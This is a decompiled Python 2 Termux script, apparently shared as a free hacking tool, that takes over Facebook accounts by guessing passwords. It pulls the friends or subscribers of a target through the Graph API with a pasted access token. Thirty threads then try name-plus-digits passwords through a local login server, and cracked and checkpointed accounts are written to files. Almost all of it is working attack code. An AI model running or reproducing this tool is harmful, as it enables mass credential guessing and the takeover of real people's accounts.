# decompile by Tech Abm
# source code by Tech Abm
# aahil bhnchod decompile done 3:)

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
from multiprocessing.pool import ThreadPool
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
os.system('termux-setup-storage')
os.system('clear')
logo = '\n\n\x1b[1;92m\n   _____    _________  \n  /  _  \\   \\_   ___ \\ \n /  /_\\  \\  /    \\  \\/  \x1b[1;93m SPEEDI UPDATE 2.0.1"\x1b[1;92m\n/    |    \\ \\     \\____\n\\____|__  /  \\______  /\n        \\/          \\/ \n\x1b[1;97m----------------------------------------------\n   Author   : RANA AAHIL\n   Github   : https://github.com/TheAahil\n   Youtube  : Aahil Creations\n----------------------------------------------\n             \x1b[1;92mFREE MODE ACTIVATED\n\x1b[1;97m------------------------------------------------\nBE A GOOD PERSON BUT DONT WASTE TIME TO PROVE IT\n------------------------------------------------ '
CorrectUsername = 'Rana'
loop = 'true'
while loop == 'true':
    print logo
    print '\x1b[1;97m               FIRST STEP LOGIN'
    print '\x1b[1;97m'
    print '\x1b[1;97m '
    username = raw_input('              \x1b[1;94mTOOL USERNAME: ')
    if username == CorrectUsername:
        print '\x1b[1;95m '
        print '         ||\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2 WELLCOME \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2|| '
        time.sleep(5)
        loop = 'false'
        print '\x1b[1;92m '
        print '               ACTIVATION START ! '
        time.sleep(10)
        print ' FREE MODE ACTIVATE !'
        os.system('clear')
    else:
        print ' FREE MODE ACTIVATE !'
        os.system('clear')

def reg():
    os.system('clear')
    print logo
    print ''
    print '\t    Generating connection'
    print ''
    print ''
    print '\x1b[1;93m            Connecting...'
    time.sleep(5)
    print ''
    print ''
    print '\x1b[1;92m  [Connected With Aahil Servers]'
    print ''
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd RRR && npm install')
    os.system('cd RRR && node index.js &')
    os.system('clear')
    time.sleep(5)
    reg2()


def reg2():
    os.system('clear')
    print ''
    print '\x1b[1;97m'
    print ''
    print ''
    print '       \xf0\x9d\x90\x83\xf0\x9d\x90\x84\xf0\x9d\x90\x80\xf0\x9d\x90\x91 \xf0\x9d\x90\x94\xf0\x9d\x90\x92\xf0\x9d\x90\x84\xf0\x9d\x90\x91\xf0\x9d\x90\x92 \xf0\x9d\x90\x93\xf0\x9d\x90\x87\xf0\x9d\x90\x80\xf0\x9d\x90\x8d\xf0\x9d\x90\x8a\xf0\x9d\x90\x92 \xf0\x9d\x90\x85\xf0\x9d\x90\x8e\xf0\x9d\x90\x91 \xf0\x9d\x90\x94\xf0\x9d\x90\x92\xf0\x9d\x90\x88\xf0\x9d\x90\x8d\xf0\x9d\x90\x86 \xf0\x9d\x90\x8c\xf0\x9d\x90\x98 \xf0\x9d\x90\x93\xf0\x9d\x90\x8e\xf0\x9d\x90\x8e\xf0\x9d\x90\x8b'
    print '       \xf0\x9d\x90\x8d\xf0\x9d\x90\x8e\xf0\x9d\x90\x96 \xf0\x9d\x90\x98\xf0\x9d\x90\x8e\xf0\x9d\x90\x94 \xf0\x9d\x90\x86\xf0\x9d\x90\x84\xf0\x9d\x90\x93 \xf0\x9d\x90\x8e\xf0\x9d\x90\x8a \xf0\x9d\x90\x80\xf0\x9d\x90\x8d\xf0\x9d\x90\x83 \xf0\x9d\x90\x82\xf0\x9d\x90\x8f \xf0\x9d\x90\x88\xf0\x9d\x90\x83\xf0\x9d\x90\x92'
    print '       \xf0\x9d\x90\x82\xf0\x9d\x90\x8f \xf0\x9d\x90\x88\xf0\x9d\x90\x83\xf0\x9d\x90\x92 \xf0\x9d\x90\x8e\xf0\x9d\x90\x8f\xf0\x9d\x90\x84\xf0\x9d\x90\x8d \xf0\x9d\x90\x88\xf0\x9d\x90\x8d \xf0\x9d\x9f\x93 \xf0\x9d\x90\x83\xf0\x9d\x90\x80\xf0\x9d\x90\x98\xf0\x9d\x90\x92 \xf0\x9d\x90\x86\xf0\x9d\x90\x94\xf0\x9d\x90\x91\xf0\x9d\x90\x8d\xf0\x9d\x90\x93\xf0\x9d\x90\x84\xf0\x9d\x90\x84\xf0\x9d\x90\x83'
    print ''
    print '\x1b[1;95m'
    print ' \xe2\x80\xa2 THIS TOOL IS FREE SO DONT BUY FROM ANY ONE \xe2\x80\xa2 '
    time.sleep(2)
    print ''
    print '\x1b[1;96m '
    print ' \xe2\x80\xa2 THIS TOOL IS COMPLETELY CODED BY RANA AAHIL \xe2\x80\xa2 '
    time.sleep(5)
    login()


def login():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print ''
        print '\t      [ Login With token ]'
        print ''
        print 'Paste token here '
        token = raw_input(':')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print ''
        print '\tLogged in token has expired'
        os.system('rm -rf access_token.txt')
        print ''
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print ''
    print '             LOGIN ID : ' + name
    print ''
    print 47 * '-'
    print ' \x1b[1;91m          Kaash Koi Toh Aesa Ho'
    print '         Jo Ander Se Bahar Jaisa Ho'
    print '\x1b[1;97m'
    print 47 * '-'
    print ''
    print ' [1] START'
    print ' [2] FOLLOW AAHIL ON FB '
    print ' [3] CONTACT WITH OWNER '
    print ''
    menu_option()


def menu_option():
    select = raw_input(' Choose option: ')
    if select == '1':
        crack()
    elif select == '2':
        os.system('xdg-open https://www.facebook.com/aahilrana4072')
        menu()
    elif select == '3':
        os.system('xdg-open https://www.facebook.com/103679511141844')
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print ''
    print ''
    print '        [1] Clone From Public'
    print '        [2] Clone From Followers'
    print '        [0] Back'
    print ''
    crack_select()


def crack_select():
    select = raw_input(' Choose option: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print ''
        print '\x1b[1;93m \xe2\x8b\x89\xe2\x94\x81\xe2\x94\x81\xe3\x80\x90ENTER YOUR DIGITS\xe3\x80\x91\xe2\x94\x81\xe2\x94\x81\xe2\x8b\x8a'
        print ''
        print '    \x1b[1;94m     \xe2\x97\xa4\xe2\x94\x80\xe3\x80\x90 example : 123 1234 12345 786 \xe3\x80\x91\xe2\x94\x80\xe2\x97\xa5'
        print '\x1b[1;97m'
        print ''
        idt = raw_input(' Input id: ')
        p1 = raw_input(' Name + your digit: ')
        p2 = raw_input(' Name + your digit: ')
        p3 = raw_input(' Name + your digit: ')
        p4 = raw_input(' Name + your digit: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
            print ''
            print ' Cloning from : ' + q['name']
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print logo
        print ''
        print ''
        print '\x1b[1;93m \xe2\x8b\x89\xe2\x94\x81\xe2\x94\x81\xe3\x80\x90ENTER YOUR DIGITS\xe3\x80\x91\xe2\x94\x81\xe2\x94\x81\xe2\x8b\x8a '
        print ''
        print '    \x1b[1;94m     \xe2\x97\xa4\xe2\x94\x80\xe3\x80\x90 example : 123 1234 12345 786 \xe3\x80\x91\xe2\x94\x80\xe2\x97\xa5'
        print '\x1b[1;97m'
        print ''
        idt = raw_input(' Input id: ')
        p1 = raw_input(' Name + your digit: ')
        p2 = raw_input(' Name + your digit: ')
        p3 = raw_input(' Name + your digit: ')
        p4 = raw_input(' Name + your digit: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
            print ''
            print ' Cloning from: ' + q['name']
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print ''
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('successful.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('successful.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('successful.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[OK]     \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('successful.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    crack()


reg()
